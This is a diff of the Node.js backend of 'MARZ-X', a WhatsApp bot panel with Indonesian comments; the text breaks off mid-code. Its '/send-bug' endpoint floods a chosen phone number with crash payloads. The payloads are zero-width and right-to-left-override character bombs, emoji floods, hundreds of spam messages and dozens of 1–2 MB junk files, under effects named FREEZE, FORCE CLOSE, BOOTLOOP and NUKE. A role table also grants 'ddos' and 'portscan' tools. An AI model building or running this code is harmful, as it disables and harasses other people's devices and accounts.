@@ -1,3 +1,7 @@
+// ============================================================
+// MARZ-X BACKEND v3.1.1 – FINAL FIXED BY ZEROV1
+// ============================================================
+require('dotenv').config();
 const express = require('express');
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
 const QRCode = require('qrcode');
@@ -10,1007 +14,914 @@ const path = require('path');
 const fs = require('fs');
 const cors = require('cors');
 const WebSocket = require('ws');
+const jwt = require('jsonwebtoken');
+const bcrypt = require('bcrypt');
 
 const app = express();
 app.use(express.json());
+
+// ============================================================
+// CORS AMAN (ganti dengan domain frontend lu)
+// ============================================================
+const allowedOrigins = [
+  'http://localhost:3000',
+  'http://localhost:5500',
+  'https://marz-x-frontend.vercel.app',
+  'https://marzx.vercel.app',
+  'https://your-frontend-domain.com'
+];
 app.use(cors({
-  origin: '*',
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
 // ============================================================
-// KONFIGURASI SUPABASE
+// ENV VARIABLES
 // ============================================================
-const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
-const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;
+const JWT_SECRET = process.env.JWT_SECRET || 'RAHASIA_ANDRE_GANTI_INI';
+const PORT = process.env.PORT || 3000;
 
+if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
+  console.error('❌ SUPABASE_URL dan SUPABASE_ANON_KEY wajib di .env');
+  process.exit(1);
+}
+
+// ============================================================
+// SUPABASE CLIENT
+// ============================================================
 const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
-  realtime: {
-    transport: WebSocket
-  }
+  realtime: { transport: WebSocket }
 });
-
-console.log('✅ Supabase client initialized (WebSocket polyfill)');
+console.log('✅ Supabase connected');
 
 // ============================================================
-// SESSIONS PER USER
+// SESSIONS PER USER + INTERVAL ID
 // ============================================================
 const sessions = {};
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
 // ============================================================
-// FUNGSI WHATSAPP SOCKET (PER USER) – tanpa makeInMemoryStore
+// JWT MIDDLEWARE – VERIFIKASI TOKEN
 // ============================================================
-async function getUserSocket(username, phoneNumber) {
-    if (sessions[username] && sessions[username].isReady) {
-        return sessions[username].sock;
-    }
-
-    const authFolder = path.join(__dirname, `auth_${username}`);
-    if (!fs.existsSync(authFolder)) {
-        fs.mkdirSync(authFolder, { recursive: true });
-    }
-
-    console.log(`[AUTH] ${username} menggunakan folder: ${authFolder}`);
-
-    const { state, saveCreds } = await useMultiFileAuthState(authFolder);
-    const sock = makeWASocket({
-        printQRInTerminal: false,
-        auth: state,
-        browser: ['MARZ-X Bot', 'Chrome', '1.0.0']
-    });
-
-    // HAPUS makeInMemoryStore – tidak digunakan
-
-    let pairingCode = null;
-    let qrString = null;
-    let isReady = false;
-    let pairingAttempts = 0;
-
-    setTimeout(async () => {
-        if (!sock.authState.creds.registered) {
-            try {
-                console.log(`[PAIRING] Mencoba pairing untuk ${username}...`);
-                const code = await sock.requestPairingCode(phoneNumber);
-                pairingCode = code;
-                pairingAttempts = 0;
-                console.log(`[PAIRING] ${username} -> KODE: ${code}`);
-            } catch (err) {
-                console.error(`[ERROR] Pairing ${username}:`, err.message);
-                pairingAttempts++;
-                if (pairingAttempts < 3) {
-                    console.log(`[PAIRING] Coba ulang dalam 3 detik... (${pairingAttempts}/3)`);
-                    setTimeout(async () => {
-                        try {
-                            const code = await sock.requestPairingCode(phoneNumber);
-                            pairingCode = code;
-                            console.log(`[PAIRING] ${username} -> KODE: ${code}`);
-                        } catch (e) {
-                            console.error(`[ERROR] Pairing ulang ${username}:`, e.message);
-                        }
-                    }, 3000);
-                }
-            }
-        } else {
-            console.log(`[AUTH] ${username} sudah memiliki kredensial, skip pairing.`);
-        }
-    }, 2000);
-
-    sock.ev.on('creds.update', saveCreds);
-
-    sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        if (qr) {
-            qrString = qr;
-            console.log(`[QR] ${username} QR tersedia`);
-        }
-        if (connection === 'close') {
-            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
-            if (shouldReconnect) {
-                console.log(`[RECONNECT] ${username} mencoba reconnect...`);
-                getUserSocket(username, phoneNumber);
-            } else {
-                console.log(`[LOGOUT] ${username} logged out`);
-                isReady = false;
-                delete sessions[username];
-            }
-        } else if (connection === 'open') {
-            console.log(`[READY] ${username} siap!`);
-            isReady = true;
-            pairingCode = null;
-            qrString = null;
-        }
-    });
-
-    sessions[username] = {
-        sock: sock,
-        isReady: isReady,
-        pairingCode: pairingCode,
-        qrString: qrString,
-        phoneNumber: phoneNumber
-    };
-
-    const interval = setInterval(() => {
-        if (sessions[username]) {
-            sessions[username].isReady = isReady;
-            sessions[username].pairingCode = pairingCode;
-            sessions[username].qrString = qrString;
-        } else {
-            clearInterval(interval);
-        }
-    }, 1000);
-
-    return sock;
+function verifyToken(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Unauthorized: no token provided' });
+  }
+  const token = authHeader.split(' ')[1];
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    req.user = decoded; // { username, role, iat, exp }
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: 'Invalid or expired token' });
+  }
 }
 
 // ============================================================
-// FUNGSI UPDATE STATISTIK SUPABASE
+// LOGIN ENDPOINT – RETURN JWT TOKEN
 // ============================================================
-async function updateUserStats(username, type, target, detail) {
-    if (!username) return;
-    try {
-        const { data: stats } = await supabase
-            .from('users_stats')
-            .select('bug_count, tool_count')
-            .eq('username', username)
-            .single();
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) {
+    return res.status(400).json({ error: 'username dan password wajib' });
+  }
 
-        let bugCount = stats?.bug_count || 0;
-        let toolCount = stats?.tool_count || 0;
-        if (type === 'BUG') bugCount += 1;
-        else if (type === 'TOOL') toolCount += 1;
-
-        await supabase
-            .from('users_stats')
-            .upsert({
-                username: username,
-                bug_count: bugCount,
-                tool_count: toolCount,
-                updated_at: new Date().toISOString()
-            }, { onConflict: 'username' });
-
-        await supabase
-            .from('activity_logs')
-            .insert({
-                username: username,
-                type: type,
-                detail: `${detail}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`,
-                status: 'DONE',
-                timestamp: new Date().toISOString()
-            });
-
-    } catch (err) {
-        console.error('[ERROR] Supabase:', err);
-    }
-}
-
-// ============================================================
-// FUNGSI CEK AKSES TOOLS
-// ============================================================
-async function checkToolAccess(username, toolName) {
-    const { data: userData, error } = await supabase
-        .from('users')
-        .select('role')
-        .eq('username', username)
-        .single();
-    if (error || !userData) return false;
-    const role = userData.role;
-    const allowedTools = {
-        member: ['ddos', 'portscan'],
-        admin: ['ddos', 'portscan', 'osint', 'adminfinder'],
-        owner: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper'],
-        master: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper']
-    };
-    return allowedTools[role] && allowedTools[role].includes(toolName);
-}
-
-// ============================================================
-// MIDDLEWARE CEK MASTER
-// ============================================================
-async function checkMaster(req, res, next) {
-    const username = req.body.username || req.query.username;
-    if (!username) {
-        return res.status(401).json({ error: 'Unauthorized: username required' });
-    }
+  try {
     const { data: user, error } = await supabase
-        .from('users')
-        .select('role')
-        .eq('username', username)
-        .single();
+      .from('users')
+      .select('*')
+      .eq('username', username)
+      .single();
 
     if (error || !user) {
-        return res.status(401).json({ error: 'User not found' });
+      return res.status(401).json({ error: 'User tidak ditemukan' });
     }
-    if (user.role !== 'master') {
-        return res.status(403).json({ error: 'Forbidden: only master can access this endpoint' });
-    }
-    next();
-}
 
-// ============================================================
-// LOG MIDDLEWARE (untuk debug)
-// ============================================================
-app.use((req, res, next) => {
-    console.log(`[REQUEST] ${req.method} ${req.url} from ${req.headers.origin || 'unknown'}`);
-    next();
+    const valid = await bcrypt.compare(password, user.password);
+    if (!valid) {
+      return res.status(401).json({ error: 'Password salah' });
+    }
+
+    if (!user.active) {
+      return res.status(403).json({ error: 'Akun dinonaktifkan' });
+    }
+
+    const token = jwt.sign(
+      { username: user.username, role: user.role },
+      JWT_SECRET,
+      { expiresIn: '7d' }
+    );
+
+    res.json({
+      success: true,
+      token,
+      user: {
+        username: user.username,
+        role: user.role,
+        active: user.active,
+        permanent: user.permanent,
+        expired: user.expired
+      }
+    });
+  } catch (err) {
+    console.error('[LOGIN ERROR]', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // ============================================================
-// 1. PAIRING – DIPERBAIKI DENGAN ERROR HANDLING
+// FUNGSI WHATSAPP SOCKET (PER USER) – FIX SESSION & INTERVAL
 // ============================================================
-app.post('/pairing-code', async (req, res) => {
-    const { username, phoneNumber } = req.body;
-    console.log(`[PAIRING] Request diterima: ${username} -> ${phoneNumber}`);
-
-    if (!username || !phoneNumber) {
-        return res.status(400).json({ error: 'username dan phoneNumber wajib diisi' });
+async function getUserSocket(username, phoneNumber) {
+  // Bersihkan session lama jika ada
+  if (sessions[username]) {
+    if (sessions[username].intervalId) {
+      clearInterval(sessions[username].intervalId);
     }
+    delete sessions[username];
+  }
 
-    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
-    if (!cleanNumber.startsWith('62') && !cleanNumber.startsWith('8')) {
-        return res.status(400).json({ error: 'Nomor harus diawali 62 atau 8 (contoh: 6281234567890)' });
+  const authFolder = path.join(__dirname, `auth_${username}`);
+  if (!fs.existsSync(authFolder)) {
+    fs.mkdirSync(authFolder, { recursive: true });
+  }
+
+  const { state, saveCreds } = await useMultiFileAuthState(authFolder);
+  const sock = makeWASocket({
+    printQRInTerminal: false,
+    auth: state,
+    browser: ['MARZ-X Bot', 'Chrome', '3.0.0']
+  });
+
+  let pairingCode = null;
+  let qrString = null;
+  let isReady = false;
+  let intervalId = null;
+
+  // Pairing otomatis setelah 2 detik (hanya jika belum registered)
+  setTimeout(async () => {
+    if (!sock.authState.creds.registered) {
+      try {
+        console.log(`[PAIRING] Mencoba pairing untuk ${username}...`);
+        const code = await sock.requestPairingCode(phoneNumber);
+        pairingCode = code;
+        console.log(`[PAIRING] ${username} -> KODE: ${code}`);
+      } catch (err) {
+        console.error(`[PAIRING ERROR] ${username}:`, err.message);
+        // Jangan panggil getUserSocket lagi di sini – biar user coba ulang via endpoint
+      }
+    } else {
+      console.log(`[AUTH] ${username} sudah memiliki kredensial.`);
     }
+  }, 2000);
 
-    const finalNumber = cleanNumber.startsWith('62') ? cleanNumber : '62' + cleanNumber;
-    console.log(`[PAIRING] Nomor diformat: ${finalNumber}`);
+  sock.ev.on('creds.update', saveCreds);
 
-    if (sessions[username] && sessions[username].isReady) {
-        return res.json({ status: 'ready', message: 'Sudah terhubung', code: null });
+  sock.ev.on('connection.update', (update) => {
+    const { connection, lastDisconnect, qr } = update;
+    if (qr) {
+      qrString = qr;
+      console.log(`[QR] ${username} QR tersedia`);
     }
+    if (connection === 'close') {
+      const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) {
+        console.log(`[RECONNECT] ${username} mencoba reconnect...`);
+        setTimeout(() => {
+          getUserSocket(username, phoneNumber);
+        }, 5000);
+      } else {
+        console.log(`[LOGOUT] ${username} logged out`);
+        isReady = false;
+        delete sessions[username];
+      }
+    } else if (connection === 'open') {
+      console.log(`[READY] ${username} siap!`);
+      isReady = true;
+      pairingCode = null;
+      qrString = null;
+    }
+  });
 
-    try {
-        const socketPromise = getUserSocket(username, finalNumber);
-        const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error('Timeout 20 detik')), 20000)
-        );
+  // Simpan session dengan interval update status
+  sessions[username] = {
+    sock: sock,
+    isReady: isReady,
+    pairingCode: pairingCode,
+    qrString: qrString,
+    phoneNumber: phoneNumber,
+    intervalId: null
+  };
 
-        await Promise.race([socketPromise, timeoutPromise]);
-        console.log(`[PAIRING] Socket berhasil dibuat untuk ${username}`);
+  intervalId = setInterval(() => {
+    if (sessions[username]) {
+      sessions[username].isReady = isReady;
+      sessions[username].pairingCode = pairingCode;
+      sessions[username].qrString = qrString;
+    } else {
+      clearInterval(intervalId);
+    }
+  }, 1000);
 
-        let attempts = 0;
-        const maxAttempts = 30;
-        while (attempts < maxAttempts) {
-            const session = sessions[username];
-            if (session && session.pairingCode) {
-                console.log(`[PAIRING] Berhasil mendapatkan kode untuk ${username}: ${session.pairingCode}`);
-                return res.json({
-                    status: 'disconnected',
-                    message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon',
-                    code: session.pairingCode,
-                    expiresIn: '60 detik'
-                });
-            }
-            await delay(500);
-            attempts++;
-        }
+  sessions[username].intervalId = intervalId;
 
-        console.error(`[PAIRING] Gagal mendapatkan kode untuk ${username}`);
-        const session = sessions[username];
-        if (session && session.qrString) {
-            return res.json({
-                status: 'disconnected',
-                message: 'Gagal generate kode pairing. Coba gunakan QR Code.',
-                code: null,
-                qrAvailable: true
-            });
-        }
+  return sock;
+}
 
+// ============================================================
+// FUNGSI UPDATE STATISTIK & LOG
+// ============================================================
+async function updateUserStats(username, type, target, detail) {
+  if (!username) return;
+  try {
+    const { data: stats } = await supabase
+      .from('users_stats')
+      .select('bug_count, tool_count')
+      .eq('username', username)
+      .single();
+
+    let bugCount = stats?.bug_count || 0;
+    let toolCount = stats?.tool_count || 0;
+    if (type === 'BUG') bugCount += 1;
+    else if (type === 'TOOL') toolCount += 1;
+
+    await supabase
+      .from('users_stats')
+      .upsert({
+        username: username,
+        bug_count: bugCount,
+        tool_count: toolCount,
+        updated_at: new Date().toISOString()
+      }, { onConflict: 'username' });
+
+    await supabase
+      .from('activity_logs')
+      .insert({
+        username: username,
+        type: type,
+        detail: `${detail}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`,
+        status: 'DONE',
+        timestamp: new Date().toISOString()
+      });
+  } catch (err) {
+    console.error('[SUPABASE ERROR]', err);
+  }
+}
+
+// ============================================================
+// CEK AKSES TOOLS (role-based)
+// ============================================================
+async function checkToolAccess(username, toolName) {
+  const { data: userData, error } = await supabase
+    .from('users')
+    .select('role')
+    .eq('username', username)
+    .single();
+  if (error || !userData) return false;
+  const role = userData.role;
+  const allowedTools = {
+    member: ['ddos', 'portscan'],
+    admin: ['ddos', 'portscan', 'osint', 'adminfinder'],
+    owner: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper'],
+    master: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper']
+  };
+  return allowedTools[role] && allowedTools[role].includes(toolName);
+}
+
+// ============================================================
+// MIDDLEWARE CEK MASTER (hanya untuk admin endpoints)
+// ============================================================
+async function checkMaster(req, res, next) {
+  const username = req.user.username; // dari token
+  const { data: user, error } = await supabase
+    .from('users')
+    .select('role')
+    .eq('username', username)
+    .single();
+
+  if (error || !user) {
+    return res.status(401).json({ error: 'User not found' });
+  }
+  if (user.role !== 'master') {
+    return res.status(403).json({ error: 'Forbidden: only master can access this endpoint' });
+  }
+  next();
+}
+
+// ============================================================
+// 1. PAIRING – FIX: gunakan verifyToken, ambil username dari token
+// ============================================================
+app.post('/pairing-code', verifyToken, async (req, res) => {
+  const { phoneNumber } = req.body;
+  const username = req.user.username;
+
+  console.log(`[PAIRING] ${username} -> ${phoneNumber}`);
+
+  if (!phoneNumber) {
+    return res.status(400).json({ error: 'phoneNumber wajib diisi' });
+  }
+
+  const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
+  if (!cleanNumber.startsWith('62') && !cleanNumber.startsWith('8')) {
+    return res.status(400).json({ error: 'Nomor harus diawali 62 atau 8' });
+  }
+  const finalNumber = cleanNumber.startsWith('62') ? cleanNumber : '62' + cleanNumber;
+
+  if (sessions[username] && sessions[username].isReady) {
+    return res.json({ status: 'ready', message: 'Sudah terhubung', code: null });
+  }
+
+  try {
+    // Buat socket (pairing akan terjadi otomatis di dalam)
+    await getUserSocket(username, finalNumber);
+
+    // Tunggu pairing code muncul (maks 30 detik)
+    let attempts = 0;
+    while (attempts < 30) {
+      const session = sessions[username];
+      if (session && session.pairingCode) {
         return res.json({
-            status: 'disconnected',
-            message: 'Gagal generate kode. Pastikan nomor benar dan coba lagi.',
-            code: null
+          status: 'disconnected',
+          message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon',
+          code: session.pairingCode,
+          expiresIn: '60 detik'
         });
-
-    } catch (error) {
-        console.error(`[PAIRING ERROR] ${username}:`, error.message);
-        return res.status(500).json({
-            error: 'Gagal melakukan pairing: ' + error.message
-        });
+      }
+      await delay(500);
+      attempts++;
     }
+
+    // Jika gagal, coba fallback QR
+    const session = sessions[username];
+    if (session && session.qrString) {
+      return res.json({
+        status: 'disconnected',
+        message: 'Gagal generate kode pairing. Coba scan QR Code.',
+        code: null,
+        qrAvailable: true
+      });
+    }
+
+    return res.status(500).json({
+      error: 'Gagal mendapatkan kode pairing. Pastikan nomor benar dan coba lagi.'
+    });
+
+  } catch (error) {
+    console.error('[PAIRING ERROR]', error);
+    res.status(500).json({ error: error.message });
+  }
 });
 
 // ============================================================
 // 2. QR CODE
 // ============================================================
-app.get('/qr/:username', async (req, res) => {
-    const { username } = req.params;
-    const session = sessions[username];
-    if (!session) return res.status(404).json({ error: 'User belum terdaftar' });
-    if (session.isReady) return res.status(400).json({ error: 'Sudah terhubung' });
-    if (!session.qrString) return res.status(404).json({ error: 'QR belum tersedia' });
-    try {
-        const qrBuffer = await QRCode.toBuffer(session.qrString, { type: 'png', width: 300, margin: 2 });
-        res.setHeader('Content-Type', 'image/png');
-        res.send(qrBuffer);
-    } catch (err) {
-        res.status(500).json({ error: 'Gagal generate QR' });
-    }
+app.get('/qr/:username', verifyToken, async (req, res) => {
+  const { username } = req.params;
+  if (req.user.username !== username) {
+    return res.status(403).json({ error: 'Anda hanya bisa melihat QR sendiri' });
+  }
+  const session = sessions[username];
+  if (!session) return res.status(404).json({ error: 'User belum terdaftar' });
+  if (session.isReady) return res.status(400).json({ error: 'Sudah terhubung' });
+  if (!session.qrString) return res.status(404).json({ error: 'QR belum tersedia' });
+  try {
+    const qrBuffer = await QRCode.toBuffer(session.qrString, { type: 'png', width: 300, margin: 2 });
+    res.setHeader('Content-Type', 'image/png');
+    res.send(qrBuffer);
+  } catch (err) {
+    res.status(500).json({ error: 'Gagal generate QR' });
+  }
 });
 
 // ============================================================
 // 3. STATUS
 // ============================================================
 app.get('/status', (req, res) => {
-    let anyReady = false;
-    for (const key in sessions) {
-        if (sessions[key].isReady) {
-            anyReady = true;
-            break;
-        }
+  let anyReady = false;
+  for (const key in sessions) {
+    if (sessions[key].isReady) {
+      anyReady = true;
+      break;
     }
-    res.json({
-        status: anyReady ? 'ready' : 'disconnected',
-        message: anyReady ? 'Bot WhatsApp siap digunakan' : 'Belum ada user yang pairing',
-        sessions: Object.keys(sessions).length
-    });
+  }
+  res.json({
+    status: anyReady ? 'ready' : 'disconnected',
+    message: anyReady ? 'Bot WhatsApp siap digunakan' : 'Belum ada user yang pairing',
+    sessions: Object.keys(sessions).length
+  });
 });
 
-app.get('/status/:username', (req, res) => {
-    const { username } = req.params;
-    const session = sessions[username];
-    if (!session) return res.json({ status: 'not_found', message: 'Belum register' });
-    res.json({
-        status: session.isReady ? 'ready' : 'disconnected',
-        message: session.isReady ? 'Siap digunakan' : 'Belum pairing',
-        phoneNumber: session.phoneNumber,
-        pairingCode: session.pairingCode,
-        qrAvailable: !!session.qrString
-    });
+app.get('/status/:username', verifyToken, (req, res) => {
+  const { username } = req.params;
+  if (req.user.username !== username) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  const session = sessions[username];
+  if (!session) return res.json({ status: 'not_found', message: 'Belum register' });
+  res.json({
+    status: session.isReady ? 'ready' : 'disconnected',
+    message: session.isReady ? 'Siap digunakan' : 'Belum pairing',
+    phoneNumber: session.phoneNumber,
+    pairingCode: session.pairingCode,
+    qrAvailable: !!session.qrString
+  });
 });
 
 // ============================================================
-// 4. SEND BUG – LENGKAP (10 EFEK) – SAMA SEPERTI SEBELUMNYA
+// 4. SEND BUG – FULL 10 EFFECTS (LANGSUNG DARI KODE ASLI)
 // ============================================================
-app.post('/send-bug', async (req, res) => {
-    const { targetNumber, effect, username, count = 0 } = req.body;
-    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
-    const session = sessions[username];
-    if (!session || !session.isReady || !session.sock) {
-        return res.status(503).json({ error: `User ${username} belum terhubung.` });
-    }
-    if (!targetNumber) return res.status(400).json({ error: 'Nomor target wajib diisi' });
+app.post('/send-bug', verifyToken, async (req, res) => {
+  const { targetNumber, effect, count = 0 } = req.body;
+  const username = req.user.username;
+  const role = req.user.role;
 
-    const { data: userData, error: userError } = await supabase
-        .from('users')
-        .select('role')
-        .eq('username', username)
-        .single();
+  if (!targetNumber) return res.status(400).json({ error: 'Nomor target wajib diisi' });
 
-    if (userError || !userData) {
-        return res.status(401).json({ error: 'User tidak ditemukan' });
-    }
+  const session = sessions[username];
+  if (!session || !session.isReady || !session.sock) {
+    return res.status(503).json({ error: `User ${username} belum terhubung.` });
+  }
 
-    const role = userData.role;
-    const allowedEffects = {
-        member: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'RESTART HARD', 'FC INSTANT'],
-        admin: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
-        owner: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
-        master: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY', 'MEGA SPAM', 'CRASH BOMB']
-    };
+  // Cek role untuk efek bug
+  const allowedEffects = {
+    member: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'RESTART HARD', 'FC INSTANT'],
+    admin: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
+    owner: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
+    master: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY', 'MEGA SPAM', 'CRASH BOMB']
+  };
 
-    if (!allowedEffects[role] || !allowedEffects[role].includes(effect)) {
-        return res.status(403).json({
-            error: `Role ${role} tidak memiliki akses ke efek "${effect}"`,
-            allowed: allowedEffects[role] || []
+  if (!allowedEffects[role] || !allowedEffects[role].includes(effect)) {
+    return res.status(403).json({
+      error: `Role ${role} tidak memiliki akses ke efek "${effect}"`,
+      allowed: allowedEffects[role] || []
+    });
+  }
+
+  const sock = session.sock;
+  const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
+  console.log(`[BUG] ${username} (${role}): ${effect} -> ${targetNumber}`);
+
+  try {
+    const send = async (text) => await sock.sendMessage(chatId, { text });
+
+    // ========== EFEK BUG (LENGKAP) ==========
+    if (effect === 'DELAY HARD') {
+      const bomb = 'A'.repeat(5000) + '\u200B'.repeat(2000) + '🔥'.repeat(3000) + '\n'.repeat(100) + '💥'.repeat(300);
+      await send(bomb.slice(0, 5000));
+      await delay(50);
+      await send(bomb.slice(5000));
+      for (let i = 0; i < 130; i++) {
+        await send(`[${i+1}/130] ⚡SPAM!`);
+        await delay(5);
+      }
+      for (let i = 0; i < 30; i++) {
+        const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
+        await sock.sendMessage(chatId, {
+          document: buffer,
+          mimetype: 'application/octet-stream',
+          fileName: `file_${i+1}.bin`,
+          caption: `📁 FILE ${i+1}/30`
         });
-    }
-
-    const sock = session.sock;
-    const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
-    console.log(`[BUG] ${username} (${role}): ${effect} -> ${targetNumber}`);
-
-    try {
-        const send = async (text) => await sock.sendMessage(chatId, { text });
-
-        // ========== EFEK BUG (LENGKAP) ==========
-        if (effect === 'DELAY HARD') {
-            const bomb = 'A'.repeat(5000) + '\u200B'.repeat(2000) + '🔥'.repeat(3000) + '\n'.repeat(100) + '💥'.repeat(300);
-            await send(bomb.slice(0, 5000));
-            await delay(50);
-            await send(bomb.slice(5000));
-            for (let i = 0; i < 130; i++) {
-                await send(`[${i+1}/130] ⚡SPAM!`);
-                await delay(5);
-            }
-            for (let i = 0; i < 30; i++) {
-                const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                await sock.sendMessage(chatId, {
-                    document: buffer,
-                    mimetype: 'application/octet-stream',
-                    fileName: `file_${i+1}.bin`,
-                    caption: `📁 FILE ${i+1}/30`
-                });
-                await delay(30);
-            }
-        } else if (effect === 'BLANK HARD') {
-            for (let loop = 0; loop < 2; loop++) {
-                for (let i = 0; i < 100; i++) {
-                    await send('\u200B'.repeat(1500) + '‎‏‎‏'.repeat(300) + '​'.repeat(800) + ' '.repeat(200));
-                    await delay(2);
-                }
-                const bomb = 'A'.repeat(15000) + '\u200B'.repeat(8000) + '🔥'.repeat(7000) + '\n'.repeat(200) + '💥'.repeat(500) + '\u202E'.repeat(3000);
-                await send(bomb.slice(0, 10000));
-                await delay(50);
-                await send(bomb.slice(10000, 20000));
-                await delay(50);
-                await send(bomb.slice(20000));
-                for (let i = 0; i < 200; i++) {
-                    await send(`[${i+1}/200] 💀`);
-                    await delay(1);
-                }
-                for (let i = 0; i < 20; i++) {
-                    const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                    await sock.sendMessage(chatId, {
-                        document: buffer,
-                        mimetype: 'application/octet-stream',
-                        fileName: `file_${i+1}.bin`,
-                        caption: `📁 FILE ${i+1}/20`
-                    });
-                    await delay(30);
-                }
-            }
-        } else if (effect === 'FREEZE HARD') {
-            for (let i = 0; i < 200; i++) {
-                await send('.');
-                await delay(2);
-                if (i % 50 === 0) {
-                    await send('A'.repeat(500) + '🔥'.repeat(100) + '\u200B'.repeat(200));
-                }
-            }
-        } else if (effect === 'FC INSTANT') {
-            for (let loop = 0; loop < 2; loop++) {
-                await send('*_~'.repeat(500) + 'TEKS RUSAK'.repeat(200) + '~_*'.repeat(500));
-                await delay(50);
-                await send('ဪ'.repeat(5000));
-                await delay(50);
-                await send('🔥'.repeat(3000) + '\u202E'.repeat(1000));
-                await delay(50);
-                for (let i = 0; i < 100; i++) {
-                    await send(`[FC] ${i+1}/100`);
-                    await delay(2);
-                }
-            }
-        } else if (effect === 'RESTART HARD') {
-            for (let i = 0; i < 30; i++) {
-                const buffer = Buffer.alloc(2 * 1024 * 1024, `${i}`.repeat(500).padEnd(2*1024*1024, 'X'));
-                await sock.sendMessage(chatId, {
-                    document: buffer,
-                    mimetype: 'application/octet-stream',
-                    fileName: `file_${i+1}.bin`,
-                    caption: `📁 FILE ${i+1}/30`
-                });
-                await delay(30);
-                if (i % 5 === 0) {
-                    await send(`[RESTART] ${i+1}/30`);
-                }
-            }
-        } else if (effect === 'BOOTLOOP HARD') {
-            for (let loop = 0; loop < 2; loop++) {
-                for (let i = 0; i < 50; i++) {
-                    await send('[LOOP] ' + '\u200B'.repeat(500) + '🔥'.repeat(50) + '\u202E'.repeat(20));
-                    await delay(5);
-                    if (i % 10 === 0) {
-                        const buffer = Buffer.alloc(1 * 1024 * 1024, `X`.repeat(500).padEnd(1024*1024, 'Y'));
-                        await sock.sendMessage(chatId, {
-                            document: buffer,
-                            mimetype: 'application/octet-stream',
-                            fileName: `loop_${i}.bin`,
-                            caption: `📁 LOOP ${i+1}`
-                        });
-                    }
-                }
-                const bomb = 'A'.repeat(5000) + '\u200B'.repeat(3000) + '🔥'.repeat(2000);
-                await send(bomb);
-            }
-        } else if (effect === 'NUKE') {
-            for (let loop = 0; loop < 2; loop++) {
-                const bomb = 'A'.repeat(8000) + '\u200B'.repeat(4000) + '🔥'.repeat(3000) + '\n'.repeat(150) + '💥'.repeat(500);
-                await send(bomb.slice(0, 7500));
-                await delay(50);
-                await send(bomb.slice(7500));
-                for (let i = 0; i < 250; i++) {
-                    await send(`[NUKE ${i+1}/250] 💀`);
-                    await delay(2);
-                }
-                for (let i = 0; i < 50; i++) {
-                    const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
-                    await sock.sendMessage(chatId, {
-                        document: buffer,
-                        mimetype: 'application/octet-stream',
-                        fileName: `file_${i+1}.bin`,
